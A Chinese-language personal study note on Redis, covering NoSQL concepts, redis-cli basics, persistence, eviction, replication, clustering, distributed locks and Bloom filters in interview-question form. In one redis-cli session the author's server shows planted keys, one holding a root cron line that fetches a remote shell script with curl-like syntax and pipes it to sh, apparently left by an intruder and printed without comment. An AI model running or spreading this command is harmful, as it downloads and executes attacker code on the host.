# Redis

早些年的单机版Mysql不够用了

读写量太大，发展了一系列发现

一个网站基本读8写2，那就把常用的读放到缓存里

这就是Nosql来了，以键值对形式存放数据在缓存中，提高查询效率，与网站使用的体验

BSON和JSON差不多，是二进制版的json，也可以当数据传输

POI操作Excel  jar包

> 为什么用Nosql？

NoSQL = Not Only SQL

泛指非关系型数据库

web2.0中许多超大规模的高并发社区!暴露出许多问题，Nosql在此环境下发展迅速。Redis是最快的。

MongDB，文档型数据库

类似，Map<String,Object>的K-V形式

> NoSQL特点

- 方便扩展，数据间没有关系

- 读取每秒11w，写每秒8W次，高性能

- 数据类型为多样型的

  - String
  - List
  - Set
  - Hash
  - Zset

- 不需要事先设计数据库，随取随用

- 传统RDBMS AND NOSQL

  ```
  传统RDBMS
  结构化组织
  sql
  数据与关系都在表中
  操作数据，定义语言
  一致性ACID
  事务性操作
  ....
  ```

  

  ```
  Nosql
  -不仅仅是数据
  -没有固定的查询语言
  -键值对KV
  列存储
  文档存储
  图形数据库(社交关系)
  最终一致性
  CAP定理 和 BASE(异地多活)
  高性能，高可用，高可扩展
  ...
  ```

>了解：3V+3高

3V:

海量，多样，实时

3高：

高并发(JUC基本），高可扩（随时水平拆分，机器不够了，搭建集群来解决），高性能（保证效率，用户体验）

企业开发基本组件

```
关系型数据库 Mysql
文档型数据库 MongoDB
图片 TFS,GFS,OSS
关键字(搜索) 搜索引擎 ElasticSearch，ISerach
波段信息 内存数据库 Redis,Memache,Tair
商品交易，外部支付接口  三方应用，支付宝，微信之类
```

## Nosql四大分类

Redis6开始支持多线程

KV键值对

- 新浪：Redis
- 美团：Redis + Tair
- 阿里，百度：Redis + memacache

文档型数据库(bson格式)

- MongoDB
  - 是一个基于分布式文件存储的数据库C++写的，主要用于处理大量文档
  - 是一个介于关系型与非关系型数据中中间的产品，MongoDB是非关系型数据库中功能最丰富，最像关系型数据库的
- ConthDB

列存储数据库

- HBase
- 分布式文件系统

图形关系数据库

- 放的是关系

![image-20220405154611414](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405154611414.png)

安装嘛就不说啦，之前就自己装好了

### win&linux

![image-20220405160111273](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405160111273.png)

```
//简单玩玩
[root@lgdlgd123 ~]# redis-cli -p 6379
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> set name lgd
OK
127.0.0.1:6379> get lgd
(nil)
127.0.0.1:6379> get name
"lgd"
127.0.0.1:6379> keys *
1) "backup3"
2) "backup2"
3) "name"
4) "backup1"
5) "backup4"
127.0.0.1:6379> get backup1
"\n\n\n*/2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh\n\n"

[root@lgdlgd123 ~]# ps -ef|grep redis
redis      947     1  0 Feb03 ?        01:59:53 /www/server/redis/src/redis-server *:6379
root     32018 31975  0 16:00 pts/0    00:00:00 redis-cli -p 6379
root     32457 32425  0 16:03 pts/1    00:00:00 grep --color=auto redis

shutdown //关闭 ctrl+c
```

### redis-benchmark测试性能

压力测试工具

简单测试下玩玩

```bash
#测试100个并发连接 每个并发10w请求
redis-benchmark -h localhost -p 6379 -c 50 -n 100000
```

```bash
====== SET ======
  100000 requests completed in 0.63 seconds
  50 parallel clients //50台并发
  3 bytes payload //每次写入3字节
  keep alive: 1 //服务器数

100.00% <= 0 milliseconds //所有请求0毫秒内完成
158227.84 requests per second

====== GET ======
  100000 requests completed in 0.64 seconds
  50 parallel clients
  3 bytes payload
  keep alive: 1

100.00% <= 0 milliseconds
156739.81 requests per second
```

### 基础知识

redis默认有16个数据库

redis.config中

```
# Specify the source name of the events in the Windows Application log.
# syslog-ident redis

# Set the number of databases. The default database is DB 0, you can select
# a different one on a per-connection basis using SELECT <dbid> where
# dbid is a number between 0 and 'databases'-1
databases 16
```

默认使用第0个数据库

```bash
#可以使用select进行切换
127.0.0.1:6379> select 3
OK
127.0.0.1:6379[3]> dbsize
(integer) 0
#查看DB大小
127.0.0.1:6379[3]> dbsize
(integer) 1
#清除当前数据库
127.0.0.1:6379[3]> flushdb
OK
#查看所有key
127.0.0.1:6379[3]> keys *
(empty array)
#清除全部
127.0.0.1:6379[3]> flushall
OK
```

为什么redis端口号为6379？

这是九宫格对应的歌女名字，作者说的= =？？？

Mysql 3306是作者女儿名字 ？？？

> redis在6前是单线程

redis很快，基于内存操作，CPU并不是性能瓶颈，redis的瓶颈根据机器的内存频率和网络带宽，可以使用单线程来实现就是用单线程了。

> Redis 为什么单线程还这么快？

redis 是C语言写的，官方提供的数据为100000+的QPS,不比Memecache差！

`redis`使用**`epoll`多路I/O复用技术**，单个线程可以处理大量的并发连接。`epoll`是一种高效的多路复用技术。

误区：高性能一定用多线程（LRU切换也需要资源），多线程一定比单线程效率高

cpu>内存频率>硬盘

核心：redis将所有数据都放在内存中，所以使用单线程操作没问题









## 什么是redis？

`Redis`(Remote Dictionary Server) (远程字典服务)是一个使用 C 语言编写的，开源的高性能非关系型（NoSQL）的键值对数据库。`Redis` 可以存储键和五种不同类型的值之间的映射。键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。`redis`每秒可以处理超过 **10万次**读写操作，是已知性能最快的Key-Value DB。另外`redis`也常用来做分布式锁。

## redis的优缺点？

**缺点：**

由于是内存数据库，所以，单台机器，存储的数据量，跟机器本身的内存大小。虽然Redis本身有key过期策略，但是还是需要提前预估和节约内存。如果内存增长过快，需要定期删除数据。

如果进行完整重同步，由于需要生成rdb文件，并进行传输，会占用主机的CPU，并会消耗现网的带宽。不过redis2.8版本，已经有部分重同步的功能，但是还是有可能有完整重同步的。比如，新上线的备机。

修改配置文件，进行重启，将硬盘中的数据加载进内存，时间比较久。在这个过程中，redis不能提供服务。

特性：

持久化，集群，事务

本次Redis基于Linux上学习，在服务器上搭建

## 为什么要用缓存？

因为`redis`的高性能与高并发。

## 为什么redis单线程还支持高并发？

因为`Redis`是基于内存的操作，CPU不是`Redis`的瓶颈，`Redis`的瓶颈最有可能是机器内存的大小或者网络带宽。既然单线程容易实现而且省去了很多上下文切换线程的时间，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。

`redis`使用**`epoll`多路I/O复用技术**，单个线程可以处理大量的并发连接。`epoll`是一种高效的多路复用技术。

## 为什么要用redis而不是map或者guava做缓存？

缓存分为本地缓存和分布式缓存。以 Java 为例，使用自带的 map 或者 guava 实现的是本地缓存，最主要的特点是轻量以及快速，生命周期随着 `jvm` 的销毁而结束，并且在多实例的情况下，每个实例都需要各自保存一份缓存，**缓存不具有一致性**。

使用 `redis` 或 `memcached` 之类的称为分布式缓存，在多实例的情况下，各实例共用一份缓存数据，缓存具有一致性。缺点是需要保持 `redis` 或 `memcached`服务的高可用，整个程序架构上较为复杂。

## Redis数据结构？string与hash的区别？

string、list、hash、set、zset。

String多应用于简单的键值对缓存；hash储存结构化数据，比如一个对象。

## redis应用场景？

计数器、分布式会话缓存、分布式锁实现等等。

## 跳跃表（skipList）？

`SkipList`是在**有序链表**的基础上进行了扩展，解决了有序链表结构查找特定值困难的问题，查找特定值的时间复杂度为`O(logn)`，他是一种可以代替平衡树的数据结构。

它的效率和红黑树以及 AVL 树不相上下，但跳表的原理相当简单，只要你能熟练操作链表，就能轻松实现一个 `SkipList`。

## redis持久化机制？

1. **RDB**：开启一个新的线程来完成往`rdb`文件中的写操作。主线程继续处理命令。**使用单独的子线程来进行持久化**。主线程不进行任何的IO操作。保证`redis`的高性能。缺点是可能会丢失一些数据。
2. **AOF** ：AOF持久化(即Append Only File持久化)，则是将`Redis`执行的每次写命令记录到单独的日志文件中，当重启`Redis`会重新将持久化的日志中文件恢复数据。AOF有一个**重写模式**，当日志文件过大时可以对其进行压缩。AOF往往效率低于RDB一些。

**AOF的追写策略**：建议使用每秒同步一次`（everysec）`策略。

**rewrite机制**：rewrite会记录上次重写时AOF文件的大小，当AOF文件是上一次大小的二倍且大于64M时触发。

## 如何选择合适的持久化方式？

一般来说两者配合使用效果最佳，当 `Redis` 重启的时候会优先载入AOF文件来恢复原始的数据，因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整。

如果可以容忍数分钟内的数据丢失，可以只选用RDB方式，还比较快。

不推荐只使用AOF方式。

## 9、过期键的删除策略？（美团）

- **定时过期**：每个设置过期时间的key都需要创建一个**定时器**，到过期时间就会立即清除。该策略可以立即清除过期的数据，对内存很友好；但是会占用大量的CPU资源去处理过期的数据，从而影响缓存的响应时间和吞吐量。
- **惰性过期**：只有当访问一个key时，才会判断该key是否已过期，过期则清除。该策略可以最大化地节省CPU资源，却对内存非常不友好。极端情况可能出现大量的过期key没有再次被访问，从而不会被清除，占用大量内存。

## redis设置键的过期时间以及永不过期命令是什么？

expire设置过期时间

persist设置键永不过期，多用于热点数据。

## redis的内存淘汰策略有哪些？

- `noeviction`：当内存不足以容纳新写入数据时，新写入操作会报错。
- `allkeys-lru`：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的key。（这个是**最常用**的）
- `allkeys-random`：当内存不足以容纳新写入数据时，在键空间中，随机移除某个key。
- `volatile-lru`：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key。
- `volatile-random`：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key。
- `volatile-ttl`：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除

## redis线程模型？（shopee）

`redis`以**单线程**模式运行，但是通过使用 I/O 多路复用来监听多个套接字（socket）， 文件事件处理器既实现了高性能的网络通信模型， 又可以很好地与 `redis` 服务器中其他同样以单线程方式运行的模块进行对接， 这保持了 `Redis` 内部单线程设计的简单性。

## redis主从复制？（shopee）

**主从连接过程：**

1. 从服务器连接主服务器，发送SYNC命令。主服务器接收到SYNC命名后，开始执行**BGSAVE**命令生成**RDB文件**并使用缓冲区记录此后执行的所有写命令。
2. 主服务器创建**快照文件**，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；
3. 从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；
4. 主服务器每执行一次写命令，就向从服务器发送相同的写命令。
5. 一旦主机挂了，从机会原地待命，但是使用 **`salveof no one`** 命令会**使从机反仆为主**。

**作用：**数据冗余、故障恢复、负载均衡、高可用的基石。使用slave of 命令将某一台redis变为从机。

## redis哨兵机制？（shopee）（滴滴）（新浪）

1. Sentinel(哨兵) **进程**是用于监控 `Redis` 集群中 Master 主服务器工作的状态
2. 在 Master 主服务器发生故障的时候，可以实现 Master 和 Slave 服务器的切换，保证系统的高可用（High Availability）
3. 为了防止`脑裂`发生，节点个数一般配置为 2n+1。

## redis集群？redis 的 key 是如何寻址的？分布式寻址都有哪些算法？了解一致性 hash 算法吗？（滴滴）

**为什么有了哨兵模式还需要集群？**

`redis`的哨兵模式基本已经可以实现高可用，读写分离 ，但是在这种模式下每台`redis`服务器都存储相同的数据，很**浪费内存**，所以在redis3.0上加入了cluster模式，实现的`redis`的**分布式存储**，也就是说每台`redis`节点上存储不同的内容。

**数据分配策略？**

采用一种叫做`哈希槽` (hash slot)的方式来分配数据，`redis cluster` 默认分配了 16384 个slot。将key的 `hashCode % 16384`得出数据的槽位。

**分布式寻址算法**

1. hash 算法（大量缓存重建）
2. 一致性 hash 算法（自动缓存迁移）+ 虚拟节点（自动负载均衡）
3. `redis` cluster（集群） 的 hash slot （槽）算法

## 一致性hash说一下?

首先面对海量数据，一台`redis`肯定是不够用的，一致性hash算法主要是用来将数据按照一定的算法规律存储到指定的`redis`服务器中。

常规的hash算法会导致一个问题：当`redis`的实例个数变了那么所有的hash值都需要重新计算，这是非常耗时的。一致性hash的出现解决了这种问题。

1. hash(IP) % 2^32 -1 求出`redis`主机在圆环中的位置，
2. 使用hash(key) % 2^32-1求出数据在环上的位置，从该位置顺时针查找到的第一个主机即该数据存储的位置。
3. 这样一来及有一个标准化的计算过程了。

## 什么是RedLock？

`Redis` 官方站提出了一种权威的基于 `Redis` 实现分布式锁的方式名叫 *`Redlock`*，此种方式比原先的单节点的方法更安全。它可以保证以下特性：

1. 安全特性：互斥访问，即永远只有一个 client 能拿到锁
2. 避免死锁：最终 client 都可能拿到锁，不会出现死锁的情况，即使原本锁住某资源的 client crash 了或者出现了网络分区
3. 容错性：只要大部分 `Redis` 节点存活就可以正常提供服务

## 缓存雪崩、击穿、穿透？（美团）（滴滴）

## 缓存预热？

秒杀开始前，商品数据以及库存都预热到redis。

## 19、Redis支持的客户端？

`Redisson`、`jedis`、`lettuce`等等，官方推荐使用`Redisson`。

## Jedis与Redisson对比有什么优缺点？

`Jedis`是`Redis`的Java实现的客户端，其API提供了比较全面的`Redis`命令的支持；`Redisson`实现了**分布式和可扩展**的Java数据结构，和`Jedis`相比，功能较为简单，不支持字符串操作，不支持排序、事务、管道、分区等`Redis`特性。`Redisson`的宗旨是促进使用者对`Redis`的关注分离，从而让使用者能够将精力更集中地放在处理业务逻辑上。

`Redisson`解决了锁的自动续期问题，只要业务还在执行，`Redisson`就会为锁自动续期。

## redis事务？

`Redis` 事务的本质是通过**MULTI、EXEC、WATCH、discard **等一组命令的集合。事务支持一次执行多个命令，一个事务中所有命令都会被序列化。在事务执行过程，会按照顺序串行化执行队列中的命令，其他客户端提交的命令请求不会插入到事务执行命令序列中。

```
multi : 标记一个事务块的开始（ queued ）
exec : 执行所有事务块的命令 （ 一旦执行exec后，之前加的监控锁都会被取消掉 ）　
discard : 取消事务，放弃事务块中的所有命令
unwatch : 取消watch对所有key的监控
```

1. 如果一个事务中的命令出现错误，那么所有命令都不会执行。
2. `Redis`事务**不保证多条指令的原子性**。
3. 基于Lua脚本可以保证脚本中的指令一次性按顺序执行。

## redis与memcached的区别？

1. **支持存储的数据类型**：`redis`支持五种类型。`memcached`支持文本类型与二进制类型。
2. **网络IO模型**：`redis`是单线程的多路IO复用模型，`memcached`是多线程的非阻塞IO模式。
3. **`redis`支持数据持久化**，`memcached`不支持
4. 使用场景：`redis`适用于复杂的数据结构环境，有持久化需求。`memcached`适用于纯<k,v>且数据量矩大的环境下。

## redis常见的性能问题与对应的解决方案？

1. **Master最好不要做任何持久化工作**，包括内存快照和AOF日志文件，特别是不要启用内存快照做持久化。
2. **如果数据比较关键，某个Slave开启AOF备份数据，策略为每秒同步一次**。
3. 为了主从复制的速度和连接的稳定性，Slave和Master最好在同一个局域网内。
4. 尽量避免在压力较大的主库上增加从库
5. Master调用BGREWRITEAOF重写AOF文件，AOF在重写的时候会占大量的CPU和内存资源，导致服务load过高，出现短暂服务暂停现象。
6. 为了Master的稳定性，主从复制不要用图状结构，用单向链表结构更稳定，即主从关系为：Master<–Slave1<–Slave2<–Slave3…，这样的结构也方便解决单点故障问题，实现Slave对Master的替换，也即，如果Master挂了，可以立马启用Slave1做Master，其他不变。

## 假如Redis有一亿个key，其中10万个key以某个固定的已知前缀开头，如何把他们都找出来？

**keys**指令可以扫描得出指定模式的key列表

但是问题是由于`redis`是单线程的，**keys指令会导致线程阻塞一段时间**，此时的线上服务会有短暂停顿直到keys指令执行完毕。

使用**scan**指令可以做到**无阻塞**的提取出指定模式的key列表。但有一定的重复几率。再做一遍去重就🆗。

## 布隆过滤器了解吗？

**解决缓存穿透的问题。**

是`redis`中的一种数据结构，它将MySQL数据库中所有可能存在的数据都缓存到布隆过滤器中。当攻击者访问不存在的数据时**迅速返回**避免请求打到数据库上导致数据库宕机问题。

**原理：**

Bloom Filter 是一种空间效率很高的**随机数据结构**，Bloom filter 可以看做是对 bit-map 的扩展。当一个元素被加入集合时，通过 **K 个 Hash 函数**将这个元素映射成一个位阵列（Bit array）中的 K 个点，把它们置为 1。 检索时，我们只要看看这些点是不是都是 1 就（大约）知道集合中有没有它。 **值得注意的是**：如果这些点有任何一个 0，则被检索元素一定不在。 如果都是 1，则被检索元素很可能在。

## 布隆过滤器的优、缺点？

**二、优点**

**空间效率**和**查询效率**都远远超过一般的算法，布隆过滤器存储空间和插入 / 查询时间都是常数O(k)。 另外, 散列函数相互之间没有关系，方便由硬件并行实现。 **布隆过滤器不需要存储元素本身，在某些对保密要求非常严格的场合有优势。**

**三、缺点**

布隆过滤器的缺点和优点一样明显。 **误算率**是其中之一。随着存入的元素数量增加，误算率随之增加。但是如果元素数量太少，则使用散列表就可以。 另外，一般情况下不能从布隆过滤器中删除元素. 我们很容易想到把位数组变成整数数组，每插入一个元素相应的计数器加 1, 这样删除元素时将计数器减掉就可以了。然而要保证安全地删除元素并非如此简单。首先我们必须保证删除的元素的确在布隆过滤器里面。这一点单凭这个过滤器是无法保证的。另外计数器回绕也会造成问题。

## redis分布式锁实现原理？

1. 一个线程尝试去获取锁lock，通过`setnx`(lock，`uuid`，过期时间)。如果lock不存在就会设置成功，返回true，否则返回false。
2. 获取分布式锁成功之后，需要使用`expire`命令设置锁有效期，防止死锁。
3. 执行相关业务逻辑
4. 释放锁，首先获取到lock对应的value，将此value与`uuid`对比，如果相同的话执行delete指令删除锁。注意！上述两个步骤需要保证**原子性**。需要使用`lua`脚本。

## Redis针对数据结构做了哪些优化？

redis数据模型：

在Redis中，会给每一个key-value键值对分配一个字典实体，就是`dicEntry`。`dicEntry`包含三部分： **key的指针、val的指针、next指针**，next指针指向下一个dicteEntry形成链表，这个next指针可以将多个哈希值相同的键值对链接在一起，**通过链地址法来解决哈希冲突的问题**

[![img](https://github.com/lokles/Web-Development-Interview-With-Java/raw/main/images/redis%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B.png)](https://github.com/lokles/Web-Development-Interview-With-Java/blob/main/images/redis数据模型.png)

- **sds** ：**Simple Dynamic String**，简单动态字符串，存储字符串数据。
- **redisObject**：Redis的5种常用类型都是以RedisObject来存储的，redisObject中的**type**字段指明了值的数据类型（也就是5种基本类型)。**ptr**字段指向对象所在的地址。

1、String： sds实现，自定义类型加入了长度，每次获取字符串长度的时间复杂度就是O(1)，而利用len和free属性对追加字符串进行优化，也可以降低重新分配内存的次数。

2、Hash： zip-list 或者 hash-table（数组+链表）扩容机制采用渐进式扩容。

3、Set： int-Set

4、Zset： skip-list

4、List： zip-list -> linked-list -> quick-list （前两者合并之后创建了快速链表）

## redis是如何保证原子操作的？

Redis是单线程的。在单线程程序中，任务一个一个地做，必须做完一个任务后，才会去做另一个任务。因而redis的操作保证了原子性。

## 什么命令会触发写RDB文件？

BGSAVE：后台处理，不会阻塞工作线程。

SAVE：会导致工作线程的阻塞。

## 知道大Key问题吗？

由于Redis主线程为单线程模型，大key也会带来一些问题，如：

1. 集群模式在slot分片均匀情况下，会出现数据和查询倾斜情况，部分有大key的Redis节点占用内存多，QPS高。
2. 大key相关的删除或者自动过期时，会出现qps突降或者突升的情况，极端情况下，会造成主从复制异常，Redis服务阻塞无法响应请求。

**redis4.0之前的大key的发现与删除方法**

- `redis-rdb-tools`工具。`redis`实例上执行`bgsave`，然后对生成的`rdb`文件进行分析，找到其中的大KEY。
- `redis-cli --bigkeys`命令。可以找到某个实例5种数据类型(String、hash、list、set、zset)的最大key。

由于在redis4.0前，没有**lazy free**机制；针对扫描出来的大key，DBA只能通过hscan、sscan、zscan方式渐进删除若干个元素，但面对过期键删除的场景，这种取巧的删除就无能为力。我们只能祈祷自动清理过期key刚好在系统低峰时，降低对业务的影响。

**Redis 4.0之后的大key的发现与删除方法**

Redis 4.0引入了memory usage命令和lazy free机制，不管是对大key的发现，还是解决大key删除或者过期造成的阻塞问题都有明显的提升。